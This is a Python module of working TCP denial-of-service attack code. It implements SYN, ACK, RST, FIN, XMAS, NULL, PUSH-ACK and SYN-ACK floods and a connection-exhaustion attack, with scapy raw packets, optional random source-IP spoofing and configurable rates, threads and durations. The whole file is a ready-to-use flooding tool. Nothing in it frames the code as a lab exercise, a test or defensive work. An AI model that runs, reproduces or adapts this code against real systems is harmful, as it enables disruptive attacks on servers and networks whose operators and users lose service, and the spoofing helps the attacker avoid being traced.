"""
Connection-Level Attack Module

Implements TCP connection-level attacks:
- SYN Flood
- ACK Flood
- RST Flood
- FIN Flood
- XMAS Scan
- Connection Exhaustion
"""

import asyncio
import socket
import struct
import random
import time
import os
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Tuple
import logging

# Try to import scapy for raw packet crafting
try:
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.sendrecv import send, sendp
    from scapy.volatile import RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

logger = logging.getLogger(__name__)


@dataclass
class ConnectionConfig:
    """Configuration for connection attacks"""
    target: str
    port: int
    duration: int = 60
    rate_limit: int = 10000  # Packets per second
    spoof_source: bool = False
    source_port_range: Tuple[int, int] = (1024, 65535)
    threads: int = 4


@dataclass
class ConnectionStats:
    """Statistics for connection attacks"""
    packets_sent: int = 0
    bytes_sent: int = 0
    errors: int = 0
    start_time: float = field(default_factory=time.time)
    
    def get_pps(self) -> float:
        elapsed = time.time() - self.start_time
        return self.packets_sent / elapsed if elapsed > 0 else 0


class ConnectionAttack(ABC):
    """Base class for connection-level attacks"""
    
    TCP_FLAGS = {
        'FIN': 0x01,
        'SYN': 0x02,
        'RST': 0x04,
        'PSH': 0x08,
        'ACK': 0x10,
        'URG': 0x20,
        'ECE': 0x40,
        'CWR': 0x80,
    }
    
    def __init__(self, config: ConnectionConfig):
        self.config = config
        self.stats = ConnectionStats()
        self._running = False
        
    @abstractmethod
    def get_tcp_flags(self) -> int:
        """Get TCP flags for this attack type"""
        pass
    
    async def start(self):
        """Start the attack"""
        self._running = True
        self.stats = ConnectionStats()
        
        logger.info(f"Starting {self.__class__.__name__} on {self.config.target}:{self.config.port}")
        
        if SCAPY_AVAILABLE and self.config.spoof_source:
            await self._attack_with_scapy()
        else:
            await self._attack_with_sockets()
            
        self._running = False
        
    async def stop(self):
        """Stop the attack"""
        self._running = False
        
    async def _attack_with_scapy(self):
        """Attack using scapy for raw packets"""
        flags = self.get_tcp_flags()
        
        tasks = []
        for _ in range(self.config.threads):
            task = asyncio.create_task(self._scapy_worker(flags))
            tasks.append(task)
            
        try:
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=self.config.duration
            )
        except asyncio.TimeoutError:
            pass
            
    async def _scapy_worker(self, flags: int):
        """Worker using scapy"""
        interval = 1.0 / (self.config.rate_limit / self.config.threads)
        
        while self._running:
            try:
                # Random source IP if spoofing
                if self.config.spoof_source:
                    src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                else:
                    src_ip = None
                    
                src_port = random.randint(*self.config.source_port_range)
                
                # Build packet
                if src_ip:
                    pkt = IP(src=src_ip, dst=self.config.target) / \
                          TCP(sport=src_port, dport=self.config.port, flags=flags, seq=random.randint(0, 2**32-1))
                else:
                    pkt = IP(dst=self.config.target) / \
                          TCP(sport=src_port, dport=self.config.port, flags=flags, seq=random.randint(0, 2**32-1))
                
                # Send packet
                send(pkt, verbose=False)
                
                self.stats.packets_sent += 1
                self.stats.bytes_sent += len(pkt)
                
            except Exception as e:
                self.stats.errors += 1
                
            await asyncio.sleep(interval)
            
    async def _attack_with_sockets(self):
        """Attack using standard sockets (limited functionality)"""
        tasks = []
        for _ in range(self.config.threads):
            task = asyncio.create_task(self._socket_worker())
            tasks.append(task)
            
        try:
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=self.config.duration
            )
        except asyncio.TimeoutError:
            pass
            
    async def _socket_worker(self):
        """Worker using standard sockets"""
        interval = 1.0 / (self.config.rate_limit / self.config.threads)
        
        while self._running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(False)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                try:
                    # Non-blocking connect (will fail but sends SYN)
                    sock.connect_ex((self.config.target, self.config.port))
                    self.stats.packets_sent += 1
                except Exception:
                    pass
                finally:
                    sock.close()
                    
            except Exception:
                self.stats.errors += 1
                
            await asyncio.sleep(interval)
            
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics"""
        return {
            'packets_sent': self.stats.packets_sent,
            'bytes_sent': self.stats.bytes_sent,
            'pps': self.stats.get_pps(),
            'errors': self.stats.errors,
        }


class SYNFlood(ConnectionAttack):
    """
    SYN Flood Attack
    
    Sends TCP SYN packets without completing handshake.
    Exhausts server's connection table.
    """
    
    def get_tcp_flags(self) -> int:
        return self.TCP_FLAGS['SYN']


class ACKFlood(ConnectionAttack):
    """
    ACK Flood Attack
    
    Sends TCP ACK packets to confuse stateful firewalls.
    """
    
    def get_tcp_flags(self) -> int:
        return self.TCP_FLAGS['ACK']


class RSTFlood(ConnectionAttack):
    """
    RST Flood Attack
    
    Sends TCP RST packets to disrupt existing connections.
    """
    
    def get_tcp_flags(self) -> int:
        return self.TCP_FLAGS['RST']


class FINFlood(ConnectionAttack):
    """
    FIN Flood Attack
    
    Sends TCP FIN packets.
    """
    
    def get_tcp_flags(self) -> int:
        return self.TCP_FLAGS['FIN']


class XMASFlood(ConnectionAttack):
    """
    XMAS Flood Attack
    
    Sends packets with FIN, PSH, and URG flags set.
    Named because the flags light up like a Christmas tree.
    """
    
    def get_tcp_flags(self) -> int:
        return self.TCP_FLAGS['FIN'] | self.TCP_FLAGS['PSH'] | self.TCP_FLAGS['URG']


class NullScan(ConnectionAttack):
    """
    NULL Scan Attack
    
    Sends packets with no flags set.
    Can bypass some firewalls.
    """
    
    def get_tcp_flags(self) -> int:
        return 0


class ConnectionExhaustion(ConnectionAttack):
    """
    Connection Exhaustion Attack
    
    Opens and holds many TCP connections to exhaust server resources.
    """
    
    def __init__(self, config: ConnectionConfig, hold_time: float = 30.0):
        super().__init__(config)
        self.hold_time = hold_time
        self._connections: List[socket.socket] = []
        
    def get_tcp_flags(self) -> int:
        return self.TCP_FLAGS['SYN']
        
    async def start(self):
        """Start connection exhaustion"""
        self._running = True
        self.stats = ConnectionStats()
        
        logger.info(f"Starting connection exhaustion on {self.config.target}:{self.config.port}")
        
        tasks = []
        for _ in range(self.config.threads):
            task = asyncio.create_task(self._exhaust_worker())
            tasks.append(task)
            
        try:
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=self.config.duration
            )
        except asyncio.TimeoutError:
            pass
            
        # Close all connections
        for sock in self._connections:
            try:
                sock.close()
            except Exception:
                pass
                
        self._running = False
        
    async def _exhaust_worker(self):
        """Worker that opens and holds connections"""
        while self._running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # Try to connect
                result = sock.connect_ex((self.config.target, self.config.port))
                
                if result == 0:
                    self._connections.append(sock)
                    self.stats.packets_sent += 1
                    
                    # Hold connection
                    await asyncio.sleep(self.hold_time)
                    
                    # Remove from list
                    if sock in self._connections:
                        self._connections.remove(sock)
                    sock.close()
                else:
                    sock.close()
                    self.stats.errors += 1
                    
            except Exception:
                self.stats.errors += 1
                
            await asyncio.sleep(0.01)


class PushAckFlood(ConnectionAttack):
    """
    PUSH-ACK Flood Attack
    
    Sends TCP packets with PSH and ACK flags.
    Commonly used in legitimate traffic, harder to filter.
    """
    
    def get_tcp_flags(self) -> int:
        return self.TCP_FLAGS['PSH'] | self.TCP_FLAGS['ACK']


class SYNACKFlood(ConnectionAttack):
    """
    SYN-ACK Flood Attack
    
    Sends TCP SYN-ACK packets.
    Can confuse servers expecting SYN.
    """
    
    def get_tcp_flags(self) -> int:
        return self.TCP_FLAGS['SYN'] | self.TCP_FLAGS['ACK']
